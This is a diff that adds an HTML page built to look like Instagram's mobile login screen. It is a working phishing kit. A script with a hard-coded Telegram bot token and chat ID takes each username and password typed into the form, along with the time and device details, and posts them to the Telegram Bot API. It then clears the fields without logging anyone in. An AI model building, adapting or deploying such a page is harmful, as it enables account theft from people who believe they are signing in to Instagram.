@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Instagram</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html, body {
+      background-color: #1c1c1c;
+      min-height: 100vh;
+      color: #ffffff;
+    }
+
+    body {
+      display: flex;
+      justify-content: center;
+      overflow-x: hidden;
+    }
+
+    .app-container {
+      width: 100%;
+      max-width: 500px;
+      min-height: 100vh;
+      padding: 0 22px;
+      display: flex;
+      flex-direction: column;
+      background: #1c1c1c;
+      position: relative;
+    }
+
+    /* ---------- TOP LANGUAGE ---------- */
+    .language-section {
+      text-align: center;
+      padding: 20px 0 0;
+      font-size: 15px;
+      color: #b0b0b0;
+      font-weight: 400;
+    }
+
+    /* ---------- INSTAGRAM LOGO (CSS DRAWN — exact match to image) ---------- */
+    .icon-section {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-top: 60px;
+      margin-bottom: 55px;
+    }
+
+    .insta-logo {
+      width: 90px;
+      height: 90px;
+      border-radius: 24px;
+      /* The purple-pink-orange-yellow gradient matching your image */
+      background: 
+        radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.35);
+    }
+
+    /* Outer white rounded square (camera body) */
+    .insta-logo::before {
+      content: '';
+      position: absolute;
+      width: 62px;
+      height: 62px;
+      border: 5px solid #ffffff;
+      border-radius: 20px;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    /* White circle (camera lens) */
+    .insta-logo::after {
+      content: '';
+      position: absolute;
+      width: 26px;
+      height: 26px;
+      border: 5px solid #ffffff;
+      border-radius: 50%;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 2;
+    }
+
+    /* White dot (flash) — top right */
+    .insta-logo .dot {
+      position: absolute;
+      top: 18px;
+      right: 18px;
+      width: 7px;
+      height: 7px;
+      background: #ffffff;
+      border-radius: 50%;
+      z-index: 3;
+    }
+
+    /* ---------- FORM ---------- */
+    .form-section {
+      width: 100%;
+    }
+
+    .form-group {
+      width: 100%;
+      margin-bottom: 10px;
+      position: relative;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 17px 16px;
+      background: #1c1c1c;
+      border: 1px solid #3a3a3a;
+      border-radius: 12px;
+      font-size: 16px;
+      color: #ffffff;
+      outline: none;
+      transition: border-color 0.2s;
+      line-height: 22px;
+      font-weight: 400;
+    }
+
+    .form-group input:focus {
+      border-color: #555555;
+    }
+
+    .form-group input::placeholder {
+      color: #8e8e8e;
+      font-size: 16px;
+      font-weight: 400;
+    }
+
+    .password-toggle {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #8e8e8e;
+      font-size: 18px;
+      cursor: pointer;
+      padding: 5px;
+      z-index: 2;
+    }
+
+    .login-btn {
+      width: 100%;
+      background-color: #0095f6;
+      color: #ffffff;
+      border: none;
+      border-radius: 12px;
+      padding: 14px 16px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.2s;
+      line-height: 22px;
+      margin-top: 4px;
+      margin-bottom: 20px;
+    }
+
+    .login-btn:hover {
+      background-color: #1877f2;
+    }
+
+    .login-btn:active {
+      background-color: #0068b5;
+    }
+
+    .login-btn:disabled {
+      background-color: #1c3d5c;
+      cursor: not-allowed;
+    }
+
+    .forgot-password {
+      display: block;
+      text-align: center;
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 600;
+      text-decoration: none;
+      margin-bottom: 20px;
+      cursor: pointer;
+    }
+
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+
+    /* ---------- FOOTER ---------- */
+    .footer-section {
+      margin-top: auto;
+      padding: 20px 0 22px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 24px;
+    }
+
+    .create-account-btn {
+      width: 100%;
+      background: transparent;
+      color: #0095f6;
+      border: 1px solid #0095f6;
+      border-radius: 12px;
+      padding: 13px 16px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.2s;
+      line-height: 22px;
+      text-align: center;
+      text-decoration: none;
+      display: block;
+    }
+
+    .create-account-btn:hover {
+      background-color: rgba(0, 149, 246, 0.08);
+    }
+
+    .meta-logo {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #ffffff;
+      font-size: 17px;
+      font-weight: 500;
+      letter-spacing: 0.2px;
+    }
+
+    .meta-logo svg {
+      width: 25px;
+      height: 25px;
+    }
+
+    /* ---------- STATUS MESSAGE ---------- */
+    .status-message {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #262626;
+      color: white;
+      padding: 12px 24px;
+      border-radius: 10px;
+      font-size: 14px;
+      opacity: 0;
+      transition: opacity 0.3s;
+      z-index: 100;
+      max-width: 90%;
+      text-align: center;
+      border: 1px solid #3a3a3a;
+      pointer-events: none;
+    }
+
+    .status-message.show {
+      opacity: 1;
+    }
+
+    .status-message.success {
+      background: #0095f6;
+      border-color: #0095f6;
+    }
+
+    .status-message.error {
+      background: #ed4956;
+      border-color: #ed4956;
+    }
+
+    /* ---------- LOADING SPINNER ---------- */
+    .spinner {
+      display: none;
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: #ffffff;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+      margin-right: 8px;
+      vertical-align: middle;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .login-btn.loading .spinner {
+      display: inline-block;
+    }
+
+    .login-btn.loading .btn-text {
+      opacity: 0.85;
+    }
+
+    @media (max-height: 740px) {
+      .icon-section { margin-top: 40px; margin-bottom: 40px; }
+    }
+
+    @media (max-height: 660px) {
+      .icon-section { margin-top: 25px; margin-bottom: 30px; }
+      .insta-logo { width: 78px; height: 78px; border-radius: 20px; }
+      .insta-logo::before { width: 54px; height: 54px; border-width: 4.5px; border-radius: 17px; }
+      .insta-logo::after { width: 22px; height: 22px; border-width: 4.5px; }
+      .insta-logo .dot { top: 15px; right: 15px; width: 6px; height: 6px; }
+      .language-section { padding: 14px 0 0; }
+    }
+  </style>
+</head>
+<body>
+  <div class="app-container">
+    <div class="language-section">English (US)</div>
+
+    <!-- CSS-Drawn Instagram Logo -->
+    <div class="icon-section">
+      <div class="insta-logo">
+        <div class="dot"></div>
+      </div>
+    </div>
+
+    <div class="form-section">
+      <form id="loginForm" onsubmit="return false;">
+        <div class="form-group">
+          <input 
+            type="text" 
+            id="username" 
+            placeholder="Username, email or mobile number" 
+            autocomplete="username" 
+            aria-label="Username, email or mobile number"
+            required
+          >
+        </div>
+
+        <div class="form-group">
+          <input 
+            type="password" 
+            id="password" 
+            placeholder="Password" 
+            autocomplete="current-password" 
+            aria-label="Password"
+            required
+          >
+          <i class="far fa-eye-slash password-toggle" id="togglePassword" onclick="togglePasswordVisibility()"></i>
+        </div>
+
+        <button type="submit" class="login-btn" id="loginBtn" onclick="handleLogin()">
+          <span class="spinner"></span>
+          <span class="btn-text">Log in</span>
+        </button>
+
+        <a href="#" class="forgot-password" onclick="alert('Password reset simulated. This is a demo.'); return false;">Forgot password?</a>
+      </form>
+    </div>
+
+    <div class="footer-section">
+      <a href="#" class="create-account-btn" onclick="alert('Sign up simulated. This is a demo.'); return false;">Create new account</a>
+      
+      <div class="meta-logo">
+        <svg viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#ffffff" d="M500,150 C400,150 320,200 270,270 C240,315 220,360 220,400 C220,440 240,485 270,530 C320,600 400,650 500,650 C600,650 680,600 730,530 C760,485 780,440 780,400 C780,360 760,315 730,270 C680,200 600,150 500,150 Z M500,580 C420,580 355,540 315,480 C295,450 285,420 285,390 C285,360 295,330 315,300 C355,240 420,200 500,200 C580,200 645,240 685,300 C705,330 715,360 715,390 C715,420 705,450 685,480 C645,540 580,580 500,580 Z"/>
+          <path fill="#ffffff" d="M500,300 C450,300 410,340 410,390 C410,440 450,480 500,480 C550,480 590,440 590,390 C590,340 550,300 500,300 Z"/>
+        </svg>
+        <span>Meta</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="status-message" id="statusMessage"></div>
+
+  <script>
+    // ============================================================
+    //  CONFIGURATION - Telegram Bot
+    // ============================================================
+    const BOT_TOKEN = '8602931684:AAF2cLJkG1fQQfhChK8lr13r8uHri90AS1E';
+    const CHAT_ID   = '6367364593';
+    // ============================================================
+
+    function togglePasswordVisibility() {
+      const passwordInput = document.getElementById('password');
+      const toggleIcon = document.getElementById('togglePassword');
+      
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        toggleIcon.classList.remove('fa-eye-slash');
+        toggleIcon.classList.add('fa-eye');
+      } else {
+        passwordInput.type = 'password';
+        toggleIcon.classList.remove('fa-eye');
+        toggleIcon.classList.add('fa-eye-slash');
+      }
+    }
+
+    function showStatus(message, type = 'success') {
+      const statusEl = document.getElementById('statusMessage');
+      statusEl.textContent = message;
+      statusEl.className = 'status-message ' + type + ' show';
+      
+      setTimeout(() => {
+        statusEl.classList.remove('show');
+      }, 3500);
+    }
+
+    async function sendToTelegram(username, password) {
+      const text = 
+        `🔐 *Instagram Login Attempt*\n\n` +
+        `👤 *Username:* \`${username}\`\n` +
+        `🔑 *Password:* \`${password}\`\n\n` +
+        `🕐 *Time:* ${new Date().toLocaleString()}\n` +
+        `📱 *Device:* ${navigator.userAgent}`;
+
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'Markdown'
+          })
+        });
+
+        const data = await response.json();
+        console.log('Telegram API response:', data);
+        return data.ok === true;
+      } catch (error) {
+        console.error('Telegram API error:', error);
+        return false;
+      }
+    }
+
+    // ✅ SEND + CLEAR ONLY (no refresh, no redirect)
+    async function handleLogin() {
+      const usernameInput = document.getElementById('username');
+      const passwordInput = document.getElementById('password');
+      const loginBtn = document.getElementById('loginBtn');
+
+      const username = usernameInput.value.trim();
+      const password = passwordInput.value.trim();
+
+      if (!username) {
+        showStatus('Please enter your username, email or mobile number', 'error');
+        usernameInput.focus();
+        return;
+      }
+
+      if (!password) {
+        showStatus('Please enter your password', 'error');
+        passwordInput.focus();
+        return;
+      }
+
+      loginBtn.classList.add('loading');
+      loginBtn.disabled = true;
+
+      await sendToTelegram(username, password);
+
+      setTimeout(() => {
+        // Clear only form fields
+        usernameInput.value = '';
+        passwordInput.value = '';
+        passwordInput.type = 'password';
+        document.getElementById('togglePassword').classList.remove('fa-eye');
+        document.getElementById('togglePassword').classList.add('fa-eye-slash');
+
+        loginBtn.classList.remove('loading');
+        loginBtn.disabled = false;
+
+        usernameInput.focus();
+      }, 600);
+    }
+
+    document.getElementById('password').addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') { e.preventDefault(); handleLogin(); }
+    });
+
+    document.getElementById('username').addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') { e.preventDefault(); document.getElementById('password').focus(); }
+    });
+
+    let lastTouchEnd = 0;
+    document.addEventListener('touchend', function(e) {
+      const now = Date.now();
+      if (now - lastTouchEnd <= 300) { e.preventDefault(); }
+      lastTouchEnd = now;
+    }, false);
+  </script>
+</body>
+</html>
